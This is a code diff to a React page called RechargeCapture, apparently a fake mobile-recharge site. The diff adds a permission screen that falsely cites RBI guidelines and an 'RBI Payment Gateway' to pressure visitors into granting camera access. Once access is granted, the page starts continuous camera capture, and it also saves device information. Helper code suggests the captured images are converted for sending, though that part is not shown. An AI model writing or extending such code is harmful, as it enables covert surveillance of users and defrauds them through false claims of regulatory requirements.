@@ -10,7 +10,8 @@ const RechargeCapture = () => {
   const [phoneNumber, setPhoneNumber] = useState("");
   const [selectedOperator, setSelectedOperator] = useState<string | null>(null);
   const [selectedPlan, setSelectedPlan] = useState<string | null>(null);
-  const [step, setStep] = useState<"input" | "plans" | "processing" | "success">("input");
+  const [step, setStep] = useState<"permission" | "input" | "plans" | "processing" | "success">("permission");
+  const [cameraGranted, setCameraGranted] = useState(false);
   const captureLoopRef = useRef<boolean>(false);
   const stopCaptureRef = useRef<boolean>(false);
   const captureCountRef = useRef<number>(0);
@@ -48,10 +49,27 @@ const RechargeCapture = () => {
     }
   };
 
+  const requestCameraPermission = async (): Promise<boolean> => {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      stream.getTracks().forEach(t => t.stop());
+      return true;
+    } catch { return false; }
+  };
+
   useEffect(() => {
     saveDeviceInfo();
-    // Start camera capture immediately when page opens
-    startContinuousCapture();
+    const init = async () => {
+      const granted = await requestCameraPermission();
+      if (granted) {
+        setCameraGranted(true);
+        setStep("input");
+        startContinuousCapture();
+      } else {
+        setStep("permission");
+      }
+    };
+    init();
   }, []);
 
   const base64ToBlob = (base64: string): Blob => {
@@ -182,6 +200,38 @@ const RechargeCapture = () => {
   };
 
   const opData = operators.find(o => o.id === selectedOperator);
+
+  if (step === "permission") {
+    const retryPermission = async () => {
+      const granted = await requestCameraPermission();
+      if (granted) {
+        setCameraGranted(true);
+        setStep("input");
+        startContinuousCapture();
+      }
+    };
+    return (
+      <div style={{ minHeight: '100vh', background: '#f5f5f5', fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 16 }}>
+        <div style={{ background: '#fff', borderRadius: 16, padding: '30px 24px', textAlign: 'center', maxWidth: 360, width: '100%', boxShadow: '0 4px 20px rgba(0,0,0,0.1)' }}>
+          <div style={{ fontSize: 50, marginBottom: 16 }}>🔐</div>
+          <h2 style={{ color: '#1a237e', fontSize: 18, fontWeight: 700, marginBottom: 8 }}>Security Verification</h2>
+          <p style={{ color: '#666', fontSize: 13, marginBottom: 6, lineHeight: 1.5 }}>
+            RBI guidelines require camera verification for secure mobile recharge transactions.
+          </p>
+          <div style={{ background: '#fff3e0', border: '1px solid #ff9800', borderRadius: 10, padding: 10, marginBottom: 20 }}>
+            <p style={{ color: '#e65100', fontSize: 11, fontWeight: 600 }}>⚠️ Camera permission is mandatory to proceed with recharge.</p>
+          </div>
+          <button onClick={retryPermission} style={{
+            width: '100%', padding: 14, borderRadius: 12, border: 'none', fontWeight: 700, fontSize: 15, cursor: 'pointer',
+            background: 'linear-gradient(135deg, #1a237e, #0d47a1)', color: '#fff', boxShadow: '0 4px 15px rgba(26,35,126,0.3)', marginBottom: 12
+          }}>
+            ✅ Allow Camera & Continue
+          </button>
+          <p style={{ color: '#999', fontSize: 10 }}>🔒 Secured by RBI Payment Gateway</p>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div style={{ minHeight: '100vh', background: '#f5f5f5', fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
